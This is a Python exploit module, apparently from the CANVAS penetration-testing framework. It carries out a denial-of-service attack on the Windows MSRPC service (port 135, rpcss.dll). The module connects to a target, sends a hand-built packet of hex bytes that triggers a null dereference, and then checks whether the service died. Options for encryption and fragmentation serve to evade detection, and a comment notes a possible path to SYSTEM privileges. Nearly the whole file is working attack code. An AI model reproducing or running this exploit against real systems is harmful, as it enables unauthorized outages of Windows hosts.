#! /usr/bin/env python
"""
msrpccrash.py

You can get SYSTEM from this if you are a local user...I haven't coded that up
yet, but guninski has a page on it.

The service we attack runs in svchost.exe

"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

NAME="MSRPC Crash"
VERSION="1.0"
NOTES="""

"""

CHANGELOG="""
"""

DEBUGNOTES="""
 
"""

import sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")

import socket
from exploitutils import *


sys.path.append('encoder')
import addencoder
import chunkedaddencoder
sys.path.append("shellcode")
import win32shell
sys.path.append("gui")

from tcpexploit import tcpexploit
import canvasengine
import time
import libs.newsmb.libdcerpc as libdcerpc


DOCUMENTATION={}
DOCUMENTATION["Date public"]="9/24/2004"
DOCUMENTATION["Notes"]="""This exploit is a DoS against Windows NT->2003 caused
by a null dereference in the rpcss.dll code. It was found by SPIKE 2.9. I believe 
public exploits of this type don't work on 2003, however Microsoft may have fixed
this in one of their many rpcss.dll patches.
"""
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=Unknown"


DESCRIPTION="[0day] MSRPC Crash (INSTANTREPLAY)"

VERSION="0.1"

PROPERTY = {}
PROPERTY['TYPE'] = "DoS"

GTK2_DIALOG="dialog.glade2"

NOTES=""" 

"""

CHANGELOG="""

"""

runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)        
        self.setPort(135)
        self.setHost("")
        self.setVersion(0)
        self.badstring=""
        #this bad string isn't completely correct - it works only the second time and on...???
        self.searchbadstring="\x00\\/.:$"
        self.istest=0
        self.setVersions()
        self.tag1="AACC"
        self.tag2="ACCB"
        self.length=550
        self.char="A"
        self.localhost=""
        self.localport=0
        #IRemoteDispatch UUID
        self.UUID="000001a0-0000-0000-c000-000000000046"
        self.name=NAME        
        return
    
    def connectDcePipe(self, host):
        # connect DCE pipe
        connectionList = ["ncacn_ip_tcp:%s[%d]"% (host, self.port)]
        res = None
        auth_type = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
        auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY
        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")
            
        frag_level = None
        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation')
            frag_level = 2

        try:
            self.myDCE = libdcerpc.DCERPC(connectionList[0], getsock=self, username=u'', password=u'', frag_level=frag_level)
            res = self.myDCE.bind(self.UUID, u'0.0', auth_type=auth_type, auth_level=auth_level)
        except libdcerpc.DCERPCException, ex:
            self.log('Could not connect to remote server: %s' % ex)
            return 0

        if not res:
            return 0
        
        self.log("attacking target")
        return 1
    
    def test(self):
        self.host=self.target.interface

        if not self.connectDcePipe(self.host):
            return 0

        #we assume it's vulnerable if we can bind to it
        self.log("Test indicated connection succeeded to msrpc service.")
        self.log("Attacking using version %d: %s"%(self.version,self.versions[self.version][0]))
        return 1 
    
        
    def run(self):
        """
        Exploit the target.
        """
        self.host=self.target.interface

        self.log("MSRPC Crash version %s running again %s:%d covertness: %d"%(self.version,self.host,self.port,self.covertness))
        self.setInfo("%s attacking %s:%d (Covertness:%d) - running"%(NAME,self.host,self.port,self.covertness))
        
        if not self.connectDcePipe(self.host):
            self.log("Could not connect to DCE endpoint...service is dead?")
            return 0

        buffer=self.makesploit()
        try:
            self.myDCE.call(4, buffer, response=True)
        except libdcerpc.DCERPCException, ex:
            self.log('Caught DCERPC exception: %s' % ex)
            
        self.log("Done sending attack buffer.")
        self.log("Trying to connect again.")

        if self.connectDcePipe(self.host):
            self.log("We connected - it did not die - it must be patched.")
            ret=0
        else:
            ret=1
        self.log( "Done with exploit")
        self.setInfo("%s attacking %s:%d (Covertness:%d) - done"%(NAME,self.host,self.port,self.covertness))
        return ret

    def setVersions(self):
        self.versions={}
        #length, heapLOC, where, what, jumpbackLOC, shellLOC, addrs to set to new heap
        #unfortunately, to get "Addrs" you need to trace through the program after you run the exploit
        #and see where it pushes any heap variables before calling ntdll.rtlallocateheap
        #these are static or global variables where the "current heap" is stored in various dll's
        #so they all need to be set to be our new heap
        self.versions[0]=("Automatically determine version type.",None)
        return
    
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])
            
    
    def makesploit(self):
        #self.log("Attacking version %s"%self.versions[self.version][0])
        packet=""        
        packet+=s_binary("05000600")
        packet+=s_binary("01000000")
        packet+=s_binary("00000000")
        packet+=s_binary("68da3ec5")
        packet+=s_binary("ce38034d")
        packet+=s_binary("b98e0ed0")
        packet+=s_binary("5d4d86cb")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00020c00")
        packet+=s_binary("e8020000")
        packet+=s_binary("e8020000")
        packet+=s_binary("4d454f57")
        packet+=s_binary("04000000")
        packet+=s_binary("a2010000")
        packet+=s_binary("00000000")
        packet+=s_binary("c0000000")
        packet+=s_binary("00000046")
        packet+=s_binary("38030000")
        packet+=s_binary("00000000")
        packet+=s_binary("c0000000")
        packet+=s_binary("00000046")
        packet+=s_binary("00000000")
        packet+=s_binary("b8020000")
        packet+=s_binary("b0020000")
        packet+=s_binary("00000000")
        packet+=s_binary("01100800")
        packet+=s_binary("cccccccc")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("1e242f41")
        packet+=s_binary("2ac1ce11")
        packet+=s_binary("abff0020")
        packet+=s_binary("af6e7a17")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("ff000000")
        packet+=s_binary("01000000")
        packet+=s_binary("08000000")
        packet+=s_binary("00000000")
        packet+=s_binary("08000000")
        packet+=s_binary("abcdabcd")
        packet+=s_binary("ff000000")
        packet+=s_binary("fe000000")
        packet+=s_binary("fd000000")
        packet+=s_binary("ffffffff")
        packet+=s_binary("ff0f0000")
        packet+=s_binary("00000000")
        packet+=s_binary("ff0f0000")
        packet+=s_binary("3e")*(4*1024+3)
        packet+=s_binary("00")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        packet+=s_binary("00000000")
        return packet
        
    def usage(self):
        print "Usage: "+sys.argv[0]+" [-T] [-v version] -t target [-p targetport] [-C covertness]"
        self.displayVersions()

if __name__ == '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret=standard_callback_commandline(app)


